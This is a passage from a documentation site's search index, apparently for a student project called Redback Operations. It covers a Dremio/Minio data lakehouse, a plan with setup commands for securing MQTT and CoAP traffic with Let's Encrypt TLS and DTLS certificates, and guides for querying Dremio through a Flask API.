Lakehouse/Data Architecture#format","content":" Apache Iceberg is a table format, specifically for Data Lakehouses, the format has a metadata layer that the other tools utilise to enable versioning and make the tables that are Iceberg format ACID compliant, that is basically ensuring that the file you access is correct and current.  ","version":"Next","tagName":"h3"},{"title":"Dremio​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture#dremio","content":" Dremio is the UI and the Query engine, The UI allows access to the folders that are arranged in a style that is defined as a Data Lakehouse, this design aims to bring together the benefits of a data lake and a data warehouse, basically the folders are layered and named with strict rules in an effort to make finding and querying the data needed as efficiently as possible.  Dremio runs on Linux only and requires Docker to run the container. This setup is relatively short and doesn’t require much upskilling. This can be the responsibility of a single admin to initially boot up and maintain governance of the container running on the VM, these are both important when handling-over responsibilities to incoming team members each Trimester moving forward.  Dremio, when incorporated with Minio allows for unstructured or semi-structured data to be stored in the form of AWS S3 buckets, with all features typical of S3 storage.  Nessie the catalog management tool, is leveraged with Dremio for its additional features of inbuilt catalog for versioning and rollback as well as metadata management important for data governance, ensuring each project, team and user can locate the necessary data they need.  Dremio itself provides the user interface and query engine which is SQL compatible, the query language for ad-hoc and source data retrieval.  Dremio The Data Lakehouse platform  ","version":"Next","tagName":"h3"},{"title":"Migration​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture#migration","content":" To migrate data from an existing source to the data Lakehouse involves a small number of steps. Which as outlined at the beginning of this project, were to be kept as concise as possible to allow for ease of new users with each trimester’s juniors.  Currently to migrate data from an outside project to the Data Lakehouse requires creating the object storage in Minio, gathering the access key and token, moving to Dremio and inserting these credentials, where an object storage bucket is created and can be used for storage.  This concept is covered in detail as part of the handover document.  ","version":"Next","tagName":"h3"},{"title":"Orchestration and Pipelines​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture#orchestration-and-pipelines","content":" Currently, importing project data is a manual process, moving forward there is plenty of scope to accommodate pipelining and automation of ingestion. Setting up the data Lakehouse first before orchestrating source data is best-practice and Dremio platform has the capability to accept most sources and being open-source should accommodate a workaround if needed.  ","version":"Next","tagName":"h2"},{"title":"Mongo DB​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture#mongo-db","content":" To help accommodate existing data processes, part of the overall Data Lakehouse platform will include MongoDB object storage. Using Mongo DB alongside the Data Lakehouse ensures there is no disruption to teams currently relying on MDB moving forward. Mongo DB is currently utilised as unstructured storage by some project teams.  ","version":"Next","tagName":"h2"},{"title":"Next Steps​","type":1,"pageTitle":"Data Architecture","url":"/redback-documentation/docs/data-warehousing/Data Lakehouse/Data Architecture#next-steps","content":" Our architecture plan extends beyond its current state. While we have the Dremio UI and the object storage correctly functioning as a proof of concept with some project data existing in the data Lakehouse further steps are required for full integration.  The accessibility currently relies on the cooperation of Data warehouse staff. It would be best practice to arrange some governance around this.  Most importantly, we need to incorporate an orchestration tool this will eliminate the manual processes involved in entering the data and remove potential for human error as part of this process. At the time of writing (TRI 1 2024) no decision has been made in regard to orchestration and has been raised as a possible project for Tri 2 2024. ","version":"Next","tagName":"h2"},{"title":"TLS Solution for MQTT and CoAP Protocols","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#introduction","content":" Redback Operations is dedicated to revolutionizing the fitness experience by developing state-of-the-art connected fitness devices that not only enhance the enjoyment of physical activity but also its effectiveness. These devices are designed to transmit information regarding the identity, behaviours and health of its users, data outlined by the Redback Operations Security Guidelines as being sensitive information, protected by the Privacy Act 1988 (&quot;Privacy Act&quot;). For this reason, ensuring that communication is secure is of foremost importance. With this report we seek to outline the current state of security for data in transit from Redback Operations devices utilising either the MQTT or CoAP protocols. We seek to outline associated risk and propose an implementation plan for a solution that will enhance the security posture across all associated devices.  ","version":"Next","tagName":"h2"},{"title":"Definitions​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#definitions","content":" Term\tDefinitionCoAP\tConstrained Application Protocol -- UDP based internet application protocol for constrained devices. Data Lakehouse\tDatabase architecture that combines data lake and data warehouse benefits, by introducing table metadata to files in object storage. ECDSA Certificate\tElliptic Curve Digital Signature Algorithm Encryption\tThe process of converting plain, readable text to unreadable ciphertext to protect data. MQTT\tMessage Queuing Telemetry Transport -- common protocol used with IoT devices. Security Posture\tAn organisation's strength and resilience in relation to predicting, preventing, and responding to cyber threats. TLS\tTransport Layer Security UDP\tUser Datagram Protocol    ","version":"Next","tagName":"h3"},{"title":"TLS Solution​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#tls-solution","content":" TLS is a cryptographic protocol that works by setting up a secure connection through a process called the TLS Handshake. This is performed between a client and server and allows them to communicate in a secure way that ensures data is protected by encryption from eavesdropping, manipulation, and other attacks by providing confidentiality, authenticity, and integrity. During the TLS Handshake a client initiates a request known as the 'Hello' message to a server and the server then responds with it's 'Hello' message. Once this connection is established an authentication check is done to ensure that the server houses a valid digital certificate including a private key. If there is no active valid certificate installed, it has expired, or it has been revoked, the TLS Handshake will fail, and a connection will not be established. If an active certificate is present, the client and server complete the TLS handshake, the server's identity is authenticated, and an encrypted session is established. The client and server can then communicate securely with all data encrypted by the session keys.    Mutual TLS, or mTLS as it is known, uses the same technology as TLS but instead of having a certificate installed only on the server side, it requires a second certificate to be installed on the client side. The TLS process operates in the same way as above but allows for the identity of the server and the client, such as IoT devices to be authenticated. MTLS offers a much higher level of assurance and risk mitigation of data breach than regular TLS due to the additional authentication but is a more complex solution to implement. It should be considered in future due to the data being transmitted and associated privacy responsibilities, but this is currently out of scope for the initial Proof of Concept and Implementation.    ","version":"Next","tagName":"h3"},{"title":"Application of TLS Solution​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#application-of-tls-solution","content":" TLS can be applied to a vast array of use cases, including, but not limited to securing websites, securing IoT communication and connections, email security, API security, VPN connection, FTP file transfers, secure software update downloads, cloud services, authentication via OIDC or similar and secure payments. Given the nature of the information being captured and communicated throughout the Redback Operations environment but internal and external, having encryption and authentication in place to protect that data is a critical, proactive measure that can be taken to secure that data.  While this implementation focuses on securing MQTT and CoAP communications there are likely many additional use cases that can be uncovered for the application of TLS in a very similar way, utilising the Let's Encrypt and Certbot combination. This can be used for the mobile app that is being developed, for the company website, for any APIs that are to be utilized, for the database server, as just a start. This planning document serves as the framework and guidelines for any future application of TLS in the Redback Organisation.  ","version":"Next","tagName":"h3"},{"title":"Current State​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#current-state","content":" ","version":"Next","tagName":"h2"},{"title":"Overview​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#overview","content":" Redback Operations have implemented a messaging protocol allowing their devices to feed data to a central database where it can be processed to provide value to users in diverse ways. The currently utilized protocol is MQTT, which is a lightweight protocol that is scalable and reliable and a common way to connect IoT devices over the internet. There is a current review assessing the viability of CoAP as an alternative protocol allowing an even more lightweight solution improving speed of processing, though there is not a current implementation for this protocol. Redback Operations Project 1 has plans to switch to CoAP later this semester from the current MQTT communications.  Currently MQTT is used throughout the organisation in several ways. Project 1 is using MQTT to communicate between a Raspberry Pi attached to their smart bike, their VR game and are working toward communicating with their mobile app. They are using a HiveMQ broker but have access issues, and are looking into using data warehousing's VM's MQTT broker which relies on Mosquitto. Project 4 -- Orion previously undertook an assessment of various MQTT Servers, or Brokers, and identified the recommended services to be provided by HiveMQ. This was followed by an Implementation Plan and subsequent implementation of HiveMQ as the broker for Project 1. The focus for this team was deployment of a functional solution for the transmission of data collected by the Redback devices, and sent back to a central database, currently Mongo DB is utilized by some project teams, with a proposal to adopt Dremio as a Data Lakehouse. Here is an overview of current Project 1 related architecture:    Overview of broader proposed architecture including additional provision of services such as web server, API and NTP server:    It has been recognized that the data Redback Operations is handling requires protection as it is sensitive and protected by the Privacy Act. Redback Operations is responsible for ensuring health, personal and biometric data collected or transmitted by our devices is protected from data leakage or breach.  ","version":"Next","tagName":"h3"},{"title":"Current Architecture​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#current-architecture","content":" MQTT Architecture    Central to an MQTT architecture is the MQTT Broker. There are several MQTT Brokers available for implementation, Redback Operations currently utilise two solutions, HiveMQ, and Mosquitto. The current HiveMQ broker is hosted as a serverless cloud service offering usage limited to 100 free connections, 10GB data traffic per month, MQTT versions 3.1, 3.1.1, 5.0, WebSocket support, basic authorization rules and most relevant to this report is the included MQTT over TLS/SSL offering. Some of risks associated with this broker are that it includes basic authorization rules, but does not offer any opportunity to configure the broker as a developer, and there is an elevated risk with this being a shared MQTT platform. This may mean it carries a higher risk of unauthorized access or data breach. The limit of 100 connections presents an issue with scalability, particularly if this is utilized as a companywide service connecting with all devices utilising MQTT. HiveMQ identify this service as being suitable only for basic MQTT learning and experimenting and the application of this in Redback long term will likely not be suitable. Finally uptime may be an issue as there are no uptime SLAs for this solution.  The Moscquitto MQTT Broker is hosted within the on-premise infrastructure for Redback Operations on a virtual machine that can be accessed via SSH. This service will offer greater configuration opportunity, greater control, and greater scalability. If managed well it may offer greater reliability than the free cloud based HiveMQ broker and it is possible for this broker to be deployed at scale as it supports thousands of connections well, not millions though, which should not be an issue for the scale of the Redback organisation. Mosquitto offers the ability to integrate with Mongo DB which is potentially a critical requirement of the Redback Operations environment.  All other components of the MQTT architecture, called clients, connect to the MQTT Broker and act as a publisher or subscriber. IoT Devices that include sensors and other technologies used for gathering data typically act as publishers, feeding data to the Broker to distribute to other clients in the network. These other clients subscribe to receive data from the broker based on categorisation called topics. When publishers send their data to the Broker it is labelled with a topic, that information is then distributed only to the devices that subscribe to the associated topic.  CoAP Architecture (proposed only)    CoAP is a protocol that has many similarities to HTTP, which makes it easy to implement for developers with an existing understanding of HTTP. Like HTTP, CoAP operates on a request-response communication model where a client sends a CoAP request to a server and the server responds with the requested data using GET, PUT, POST and DELETE methods. CoAP is suitable for both device-to-server communication and machine-to-machine communication, and it uses UDP which is a connectionless protocol rendering the solution lighter than MQTT. One compromise with CoAP is that it does not guarantee reliability by default, but requires a selection from confirmable, non-confirmable and acknowledgement.  ","version":"Next","tagName":"h3"},{"title":"Current Policies​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#current-policies","content":" There are currently several policies in place that require review to assess whether the MQTT TLS solution should be included:  Cyber Security Guidelines: Project 1 Cyber Security Guidelines: Project 3 -- Wearable Technologies for Elderly People Cyber Security Guidelines: Project 7 -- Smart Bike Project Cryptography Policy Endpoint Security Policy External Attack Surface Management Policy Server Security Policy  ","version":"Next","tagName":"h3"},{"title":"Risks - MQTT​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#risks---mqtt","content":" The number of known vulnerabilities with MQTT are growing year on year with 23 known vulnerabilities in 2020, and 33 being recorded in 2021 with 18 of those being listed as critical vulnerabilities. Many of these are still not patched today. Some examples are:  Use of insecure default configurations designed to prioritize ease of use over security. In Eclipse Mosquitto to version 2.0.5, establishing a connection to the Mosquitto server without sending data triggers a process resulting in excessive CPU consumption. This could be used by a malicious actor to perform a denial-of-service type attack. Remote code execution attacks can be caused by buffer overflow vulnerabilities allowing bad actors to inject and execute malicious code on IoT devices.  Aside from the above vulnerabilities with MQTT, which can mostly be mitigated by ensuring the most recent updates and patches are applied, the key issue with the deployment of MQTT within the Redback Operations environment is that it is not currently secured using a TLS solution. This is an optional feature of an MQTT configuration and without TLS applied all data is transmitted in plain text meaning it is vulnerable to data leak or data breach.  ","version":"Next","tagName":"h3"},{"title":"Risks - CoAP​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#risks---coap","content":" There are some good benefits of using CoAP -- it is a lightweight protocol, often preferred for gathering telemetry data. Like devices using MQTT, devices using CoAP are often reachable via public facing IP addresses accessible from the internet. This creates insecure end points where data can leak, DDoS attacks can be carried out, and access can be exploited.  Unlike the MQTT protocol, CoAP incorporates DTLS, which is based on the TLS protocol. The difference being DTLS uses UDP, which is the transport layer CoAP uses. Like TLS, DTLS will provide encryption, but also makes sure that the content cannot be altered by third parties along the network path. DTLS requires a valid EDCSA certificate with a preference to have been issued by a trusted CA to avoid the issues and vulnerabilities that go along with self-signed certificates.  ","version":"Next","tagName":"h3"},{"title":"Proposed Future State​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#proposed-future-state","content":" ","version":"Next","tagName":"h2"},{"title":"Overview​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#overview-1","content":" Both the MQTT and CoAP require a TLS x.509 certificate to ensure the data being transmitted is encrypted and not delivered in plain text. The solution proposed will enable TLS for the current MQTT related architecture and outlines the application of TLS for a suggested application of CoAP.  ","version":"Next","tagName":"h3"},{"title":"Architecture - MQTT​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#architecture---mqtt","content":"   To implement a TLS solution for an MQTT architecture we need to install a certificate on the MQTT Broker. We have reviewed the use of Let's Encrypt certificates and have identified them as being a feasible solution in conjunction with Certbot to manage the renewal of those certificates every 90 days. It is possible to implement mTLS by adding certificates to the clients as well as the server, but this is optional. It is also possible to use self-signed certificates to establish this connection, but that requires the root certificate to be installed on all clients to establish and maintain trust. Once the certificates are installed, configuration must occur on both the client and broker side to facilitate the secured connection TLS offers.  ","version":"Next","tagName":"h3"},{"title":"MQTT Server TLS Implementation​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#mqtt-server-tls-implementation","content":" *Please refer to PoC Retrospective document for validated process  Connect to the Redback Ops server containing the MQTT Broker (Mosquitto) via SSH. Check Mosquitto is installed and running by entering the following command: sudo systemctl status mosquitto Ensure Certbot is not already installed -- the expected return is nothing: which certbot Install Certbot, commands are dependent on OS: sudo apt update sudo apt install certbot Additional details can be found here: https://certbot.eff.org/instructions Ensure you have a domain associated with your server IP, for this instructional we'll refer to it as mqttserver.domain.com Prove domain control and obtain a certificate: sudo certbot certonly \\--standalone -d mqttserver.domain.com You should now be able to locate the certificate files in /etc/letsencrypt/live/yourdomain.com/. Locate files: fullchain.pem (cert file), and privkey.pem (private key) Copy Mosquitto config file -- usually found at '/etc/mosquitto/mosquitto.conf' rename copy as '/etc/mosquitto/tlsconf.d/'. Add the following code to enable TLS: listener 8883 cafile /etc/letsencrypt/live/mqttserver.domain.com/chain.pem certfile /etc/letsencrypt/live/mqttserver.domain.com/fullchain.pem keyfile /etc/letsencrypt/live/mqttserver.domain.com/privkey.pem tls_version tlsv1.2   listener 8883 specifies the port for TLS connections (default is 8883 for TLS). cafile points to the CA certificate file (part of the Let's Encrypt chain). certfile points to your server certificate. keyfile points to your private key. tls_version specifies the minimum TLS version to use.  Restart Mosquitto to apply the config changes: sudo systemctl restart mosquitto Verify config by testing with MQTT Clients mosquitto_sub -h mqttserver.domain.com -p 8883 -t test/topic \\--cafile /etc/letsencrypt/live/mqttserver.domain.com/chain.pem *You may need to adjust the port -- please review In the case a client fails to connect, check Mosquitto logs for errors. sudo journalctl -u mosquitto Once TLS secured connection is active, automate certificate renewal. Check to see if Certbot has a cron job or systemd timer set up correctly: sudo systemctl list-timers *You are looking for &quot;certbot.timer&quot;. Reload Mosquitto config after successful renewal: sudo nano /etc/letsencrypt/renewal-hooks/post/reload-mosquitto.sh #!/bin/bash systemctl reload mosquitto sudo chmod +x /etc/letsencrypt/renewal-hooks/post/reload-mosquitto.sh   ","version":"Next","tagName":"h3"},{"title":"Raspberry Pi TLS Implementation for mTLS option​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#raspberry-pi-tls-implementation-for-mtls-option","content":" For reference if an mTLS solution is required in future. Below process will need to be tested and validated.  Start by ensuring system is updated: sudo apt update sudo apt upgrade Install Certbot, this is the command for all OS except Apache: sudo apt intall certbot Ensure you have a valid domain name pointing at your IP, and that port 80 and port 443 are not blocked. If you are using Cloudflare DNS services have the DNS set to bypass proxy servers. Ensure port 80 is also forwarded. Let's assume we are not running Apache, we now need to grab a Let's Encrypt cert using the built in standalone python server: sudo certbot certonly \\--standalone -d devicedomain.com -d www.devicedomain.com Enter required detail for Let's Encrypt as prompted. Certificate should then be issued. If you experience issues double check settings in question 3 and try again. Certificates should now be stored at /etc/letsencrypt/live/devicedomain.com/ Installing the certificate (this is a NGINX guide, you may need to redefine for other OS), start by opening NGINX config file: /etc/nginx/ or /etc/nginx/sites-available/ Open file in text editor and look for a block as follows: server { listen 80 default_server; listen \\[::\\]:80 default_server; root /usr/share/nginx/html; index index.html index.htm; server_name devicedomain.com; location / { try_files \\$uri \\$uri/ =404; } } In this code block, find: listen \\[::\\]:80 default_server Below this line we will need to add an additional command to instruct NGINX to listen on port 443, which is the port that handles HTTPS/SSL traffic and web browser connections: listen 443 ssl; Find: server_name example.com; Below this add: ssl_certificate /etc/letsencrypt/live/devicedomain.com/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/devicedomain.com/privkey.pem; NGINX now knows how to locate the certificate files for the TLS Handshake, and decryption.  ","version":"Next","tagName":"h3"},{"title":"Architecture - CoAP​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#architecture---coap","content":"   In the case of CoAP we need to issue and install ECDSA certificates onto the CoAP server(s). As we are using DTLS, rather than TLS, we need to convert the certificate files from .pem to PKCS12 format for them to be usable in this context. We then configure the CoAP server -- these are most commonly Eclipe Californium or libcoap based -- and set up the KeyStore and TrustStore. As in the case of MQTT, if you choose to implement mutual authentication, certificates can be installed on clients, but this is not essential.  ","version":"Next","tagName":"h3"},{"title":"CoAP Implementation​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#coap-implementation","content":" Set up CoAP server within the on-premises, or cloud environment, and ensure it has an associated domain that we can prove control of. Install Certbot -- this is dependent on which OS you are utilising, command line instructions can be found here:https://certbot.eff.org/instructions . An example of this is: sudo apt-get update sudo apt-get install certbot Prove domain control (coapserver.domain.com) and obtain an ECDSA certificate: sudo certbot certonly --standalone --preferred-challenges http --key-type ecdsa -d coapserver.domain.com You should now be able to locate the certificate files in /etc/letsencrypt/live/coapserver.domain.com/. Locate files: fullchain.pem (cert file), and privkey.pem (private key) Because we are using DTLS, not TLS we need to convert the .pem files to PKCS12 format openssl pkcs12 -export -in /etc/letsencrypt/live/coapserver.domain.com/fullchain.pem -inkey /etc/letsencrypt/live/coapserver.domain.com/privkey.pem -out coap-server.p12 -name &quot;coap-server&quot; You may need to extract key and certificate from the P12 file: openssl pkcs12 -in coap-server.p12 -nocerts -out coap-server.key -nodes openssl pkcs12 -in coap-server.p12 -clcerts -nokeys -out coap-server.crt Next you will need to configure your CoAP server with DTLS -- the commands will depend on your chosen CoAP implementation. A popular option is libcoap where you would perform the following commands: Install libcoap: sudo apt install libcoap2 libcoap-dev Configure DTLS on your CoAP server: TBC - CoAP server must be identified Ensure CoAP server is running and configured with DTLS. Test using CoAP Client library: coap-client -m get -u &quot;your-username&quot; -k &quot;your-password&quot; coaps://coapserver.domain.com/resource   ","version":"Next","tagName":"h3"},{"title":"Risk Mitigation and Best Practice​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#risk-mitigation-and-best-practice","content":" There are several actions we can take to mitigate risk and apply best practice. These include:  Enabling encryption of data transmitted using MQTT connections through Transport Layer Security (TLS) ensures confidentiality and integrity.  Ensure you regularly check for and apply any updates and patches released by your MQTT software vendor. You may need to update your broker, clients and libraries to ensure you are addressing vulnerabilities as they are discovered.  Monitoring and intrusion detection practices are critical in both MQTT and CoAP environments to identify and respond to suspicious activity on either network.  In a CoAP based environment ensure both DTLS and ECDSA are utilised. The combination of the two will provide the best security and the best performance.  Key rotation is important in both MQTT and CoAP. The shorter the life of your keys the more secure your environment is, as any vulnerability relating directly to the key in use is mitigated by rotating to the new key. It means there is only a limited time attackers have to 'break' your cryptographic key and assume control of your data and systems. With Let's Encrypt, certificates have a maximum lifespan of 90 days, and they are rotated automatically with the use of Certbot.  Key Storage is also very important and in the case of any key and secret storage, these assets are best held within an HSM, whether it be hardware or software based.  ","version":"Next","tagName":"h3"},{"title":"Feasibility Assessment​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#feasibility-assessment","content":" Technical Feasibility  Certificate Issuance and Management  By using a combination of Let's Encrypt and Certbot certificates can be successfully issued and installed in both the MQTT and CoAP use cases. Certbot ensures that certificates are rotated as required to provide continuity of valid certificates on the server or device we are protecting.  Certificate Details  The certificates issued by Let's Encrypt are in .pem format. This format is suitable for MQTT but not for CoAP. However, CoAP can utilise a .p12 certificate file which can be derived from converting a .pem file into this format. CoAP also requires the use of an ECDSA based certificate which utilises an Eliptic Curve based algorithm for encryption. In this way we can cover both use cases successfully.  MQTT Broker Configuration  Redback Operations use both Mosquitto and HiveMQ Brokers, and both of these options do support TLS.  Financial Feasibility  The above solutions are all free of charge, so pose a feasible option from a financial perspective. The components are Certbot to handle certificate automation, and Let's Encrypt to issue free digital certificates. These tools are presented with a recommendation to utilize a Mosquitto MQTT broker which is also free of charge.  Operational Feasibility  The proposed solution is relatively simple to deploy and incorporate into operational process as a standard across the organization. It can be incorporated into the management and associated development of Redback Operations end points and does not add great complexity to current processes. The benefit of standardizing the use of this TLS solution for MQTT and CoAP is that it greatly reduces risk of data compromise and improves the overall security posture of the organization. This is a lightweight solution that should not jeopardise performance or scalability of Redback Operations product offering.  Security Feasibility  The addition of TLS for MQTT and DTLS for CoAP will each add great security benefit as it results in encrypted data hidden from attackers or eavesdroppers within the Redback environment. It also protects data from being tampered with. The other benefit for these solutions is authentication. These security protocols allow a process of authenticating a server to a client to ensure they are communicating with the legitimate machine.  ","version":"Next","tagName":"h3"},{"title":"Change Management​","type":1,"pageTitle":"TLS Solution for MQTT and CoAP Protocols","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/secure-code/TLSPlan#change-management","content":" Planning:  Define objectives and scope.Define current state.Define proposed future state.Assess current knowledge and skill level for this solution.Engage current stakeholders including developers of IoT and other appliance code, owners of end points including authority for current MQTT infrastructure, Project Team Leaders, Organisation Leaders.  Design and Configuration:  Design TLS for MQTT solution, configuration, and security policies.Design DTLS for CoAP solution, configuration, and security policies.Record all planning and design content within Business and Implementation Plan Document.  Pilot Implementation:  Set up and configure TLS certificates and MQTT brokers and clients for single use case.Set up and configure DTLS certificates and CoAP brokers and clients for single use case if available.  Testing and Validation:  Validate and record step-by-step guide for use as an enablement tool.Perform functional, security, and performance testing.Optimize configurations as needed.  Org-wide Deployment:  Ensure enablement materials are in place prior to broader deployment.Map additional use cases and applicable projects.Plan and execute deployment of solution to wider organisation.  Post-Deployment:  Monitor, maintain, and manage certificates.Update documentation and provide training.Review and implement improvements. ","version":"Next","tagName":"h3"},{"title":"Maintaining the structured Dremio solution","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Dremio/Managing-the-structured-solution","content":"","keywords":"","version":"Next"},{"title":"How the solution works​","type":1,"pageTitle":"Maintaining the structured Dremio solution","url":"/redback-documentation/docs/data-warehousing/Dremio/Managing-the-structured-solution#how-the-solution-works","content":" Think of the structured solution as a datalakehouse (Minio) which can store files of any type with Dremio layered over it as the interactable UI for doing sql queries on a sql table. They are linked through adding minio as a source for dremio to store and access the data. As of writing this documentation we have three buckets on minio though only project-2 and project-3 are connected to dremio.   ","version":"Next","tagName":"h3"},{"title":"How minio works​","type":1,"pageTitle":"Maintaining the structured Dremio solution","url":"/redback-documentation/docs/data-warehousing/Dremio/Managing-the-structured-solution#how-minio-works","content":" To create a new bucket simply go into minio and select the buckets tab, name it and press create.   To link it to dremio you'll need to go into minio again and create an access key and copy down the access key and secret key it gives you.   ","version":"Next","tagName":"h3"},{"title":"How dremio works​","type":1,"pageTitle":"Maintaining the structured Dremio solution","url":"/redback-documentation/docs/data-warehousing/Dremio/Managing-the-structured-solution#how-dremio-works","content":" Then go to dremio click add source.   Then select amazon s3.  For the first tab of details simply enter any desired name for the source, the access and secret key you copied from the minio section and ensure encrypt connection is off.   Then for the advanced details tab specify the path of the bucket like below, it should just be /nameofbucketinminio and add three connection properties filling them out the same as seen below.   Then press save and it should add it.  ","version":"Next","tagName":"h3"},{"title":"Creating tables in dremio​","type":1,"pageTitle":"Maintaining the structured Dremio solution","url":"/redback-documentation/docs/data-warehousing/Dremio/Managing-the-structured-solution#creating-tables-in-dremio","content":" As of writing this documentation the method of converting and uploading data as a sql table is through this script which is currently only uploaded to a forked repository of Redback Operation's github but should be merged soon in the directory: redback-data-warehouse/Structured Dremio Solution/Script/pipeline.py.  The script takes in a csv file and creates a sql table out of it in dremio. If you have access to dremio you can see the table and use the sql runner tab on the left to query it.  ","version":"Next","tagName":"h3"},{"title":"How the flask api works​","type":1,"pageTitle":"Maintaining the structured Dremio solution","url":"/redback-documentation/docs/data-warehousing/Dremio/Managing-the-structured-solution#how-the-flask-api-works","content":" The flask api is a level of security and convenience on top of the dremio rest api to prevent malicous use of sql commands. It allows people connected to the deakin network through anyconnect VPN to query their data in dremio.  The code for the app and docker container running it can be found here, that link is the same fork as the script and should be added to the main branch soon in the same directory.  The guide on how to use the api as a data analyst will be uploaded alongside this one and should be found in the same folder labeled structured solution. ","version":"Next","tagName":"h3"},{"title":"How to access data stored in dremio datawarehouse (for data analysts)","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Dremio/Dremio-API","content":"","keywords":"","version":"Next"},{"title":"Making a SQL request to dremio in jupyter​","type":1,"pageTitle":"How to access data stored in dremio datawarehouse (for data analysts)","url":"/redback-documentation/docs/data-warehousing/Dremio/Dremio-API#making-a-sql-request-to-dremio-in-jupyter","content":" The first step in ensuring you have the correct packages installed. Required for this guide can be downloaded with this command.  pip install requests pandas     Then import these into your notebook.  import requests import json import pandas as pd     After that declare the api url exactly as below.  api_url = &quot;http://10.137.0.149:5001/dremio_query&quot;     Then declare the headers.  headers = { &quot;Content-Type&quot;: &quot;application/json&quot; }     Then the sql query you wish to query the database with.  sql_query = { &quot;sql&quot;: &quot;SELECT * FROM \\&quot;project-3\\&quot; \\&quot;extended_activities\\&quot; LIMIT 10;&quot; }   As of writing this documentation, users of this api are restricted to using only SELECT queries to prevent malicous use. There is also two usable sources being project-3 and project-2 though the tables within those sources are subject to change in which this documentation will likely be updated with a directory guide.    Then send the post request and store the response.  response = requests.post(api_url, headers=headers, data=json.dumps(sql_query))       Parse the JSON reponse.  result = response.json()     Finally convert it into data frame.  df = pd.DataFrame(result['rows'])     Which you can use just like any other dataframe like:  display(df)  ","version":"Next","tagName":"h3"},{"title":"Data Warehouse Administration","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Data Warehouse Overview","content":"","keywords":"","version":"Next"},{"title":"Credentials and Admin Users​","type":1,"pageTitle":"Data Warehouse Administration","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Data Warehouse Overview#credentials-and-admin-users","content":" There are many credentials for each tool or software associated with the Data Warehouse.  There is a list of credentials that is maintained by the Data Warehouse leader &amp; Mentor will also have access and if appropriate, will be able to grant access to new users.  There is not nor should there be credentials in plain text for Data Warehouse files.  ","version":"Next","tagName":"h3"},{"title":"Further Services​","type":1,"pageTitle":"Data Warehouse Administration","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Data Warehouse Overview#further-services","content":" ","version":"Next","tagName":"h2"},{"title":"Data Provenance Pipeline​","type":1,"pageTitle":"Data Warehouse Administration","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Data Warehouse Overview#data-provenance-pipeline","content":" A key part of the infrastructure introduced in T3 of 2024 was the provenance pipeline with the purpose of tracking and storing historical meta data about all changes that occur in the system including data upload, transformation, access, deletion, etc.  The key aspects of the pipeline are the ELK stack (elasticsearch, logstash, kibana) and a postgres database acting as a provenance store.  ","version":"Next","tagName":"h3"},{"title":"Logstash​","type":1,"pageTitle":"Data Warehouse Administration","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Data Warehouse Overview#logstash","content":" Logstash is a tool for parsing data of various schemas and formats and directing them to another source, it is running on port 5044 though is only access through code.  